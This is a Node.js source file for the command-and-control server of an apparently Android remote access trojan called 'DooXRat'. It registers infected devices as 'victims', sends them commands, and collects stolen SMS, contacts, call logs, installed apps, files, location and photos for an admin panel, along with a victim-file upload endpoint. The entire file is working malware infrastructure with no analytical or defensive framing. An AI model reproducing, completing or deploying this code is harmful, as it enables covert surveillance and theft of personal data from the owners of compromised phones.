const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use('/uploads', express.static('uploads'));

const PORT = process.env.PORT || 5000;

const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const victimId = req.body.victimId || 'unknown';
    const victimDir = path.join(uploadsDir, victimId);
    if (!fs.existsSync(victimDir)) {
      fs.mkdirSync(victimDir, { recursive: true });
    }
    cb(null, victimDir);
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + '-' + file.originalname);
  }
});

const upload = multer({ storage });

const victims = new Map();
const adminSockets = new Set();

io.on('connection', (socket) => {
  console.log(`[CONNECTION] Socket ${socket.id} connected`);

  socket.on('register_victim', (data) => {
    const { deviceId, deviceInfo } = data;
    
    victims.set(deviceId, {
      id: deviceId,
      socket: socket.id,
      info: deviceInfo,
      lastSeen: Date.now(),
      status: 'online',
      data: {
        sms: [],
        contacts: [],
        callLogs: [],
        apps: [],
        files: [],
        location: null,
        photos: []
      }
    });

    socket.deviceId = deviceId;
    console.log(`[VICTIM] Registered: ${deviceId}`);
    
    broadcastToAdmins('victim_connected', {
      id: deviceId,
      info: deviceInfo,
      timestamp: Date.now()
    });
  });

  socket.on('register_admin', () => {
    adminSockets.add(socket.id);
    socket.isAdmin = true;
    console.log(`[ADMIN] Panel connected: ${socket.id}`);
    
    const victimsList = Array.from(victims.values()).map(v => ({
      id: v.id,
      info: v.info,
      status: v.status,
      lastSeen: v.lastSeen
    }));
    
    socket.emit('victims_list', victimsList);
  });

  socket.on('command', (data) => {
    const { victimId, command, params } = data;
    const victim = victims.get(victimId);
    
    if (victim && victim.status === 'online') {
      io.to(victim.socket).emit('execute_command', { command, params });
      console.log(`[COMMAND] Sent to ${victimId}: ${command}`);
    } else {
      socket.emit('command_failed', { 
        victimId, 
        error: 'Victim offline or not found' 
      });
    }
  });

  socket.on('command_result', (data) => {
    const { command, result, error } = data;
    const deviceId = socket.deviceId;
    
    if (deviceId && victims.has(deviceId)) {
      const victim = victims.get(deviceId);
      
      if (command === 'get_sms') victim.data.sms = result;
      else if (command === 'get_contacts') victim.data.contacts = result;
      else if (command === 'get_call_logs') victim.data.callLogs = result;
      else if (command === 'get_apps') victim.data.apps = result;
      else if (command === 'get_location') victim.data.location = result;
      else if (command === 'get_files') victim.data.files = result;
      
      broadcastToAdmins('command_result', {
        victimId: deviceId,
        command,
        result,
        error,
        timestamp: Date.now()
      });
    }
  });

  socket.on('heartbeat', () => {
    const deviceId = socket.deviceId;
    if (deviceId && victims.has(deviceId)) {
      const victim = victims.get(deviceId);
      victim.lastSeen = Date.now();
      victim.status = 'online';
    }
  });

  socket.on('disconnect', () => {
    console.log(`[DISCONNECT] Socket ${socket.id}`);
    
    if (socket.isAdmin) {
      adminSockets.delete(socket.id);
    }
    
    if (socket.deviceId) {
      const victim = victims.get(socket.deviceId);
      if (victim) {
        victim.status = 'offline';
        broadcastToAdmins('victim_disconnected', {
          id: socket.deviceId,
          timestamp: Date.now()
        });
      }
    }
  });
});

function broadcastToAdmins(event, data) {
  adminSockets.forEach(socketId => {
    io.to(socketId).emit(event, data);
  });
}

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  if (username === process.env.ADMIN_USERNAME && password === process.env.ADMIN_PASSWORD) {
    const token = jwt.sign({ username, role: 'admin' }, process.env.JWT_SECRET, {
      expiresIn: '24h'
    });
    
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  if (req.file) {
    res.json({
      success: true,
      filename: req.file.filename,
      path: `/uploads/${req.body.victimId}/${req.file.filename}`
    });
  } else {
    res.status(400).json({ success: false, message: 'No file uploaded' });
  }
});

app.get('/api/victims', (req, res) => {
  const victimsList = Array.from(victims.values()).map(v => ({
    id: v.id,
    info: v.info,
    status: v.status,
    lastSeen: v.lastSeen
  }));
  
  res.json(victimsList);
});

app.get('/api/victim/:id', (req, res) => {
  const victim = victims.get(req.params.id);
  
  if (victim) {
    res.json({
      id: victim.id,
      info: victim.info,
      status: victim.status,
      lastSeen: victim.lastSeen,
      data: victim.data
    });
  } else {
    res.status(404).json({ error: 'Victim not found' });
  }
});

app.get('/health', (req, res) => {
  res.json({ 
    status: 'online', 
    victims: victims.size,
    admins: adminSockets.size,
    uptime: process.uptime()
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n=================================`);
  console.log(`   DooXRat C2 Server ONLINE`);
  console.log(`=================================`);
  console.log(`Server: http://0.0.0.0:${PORT}`);
  console.log(`Admin: ${process.env.ADMIN_USERNAME}`);
  console.log(`=================================\n`);
});
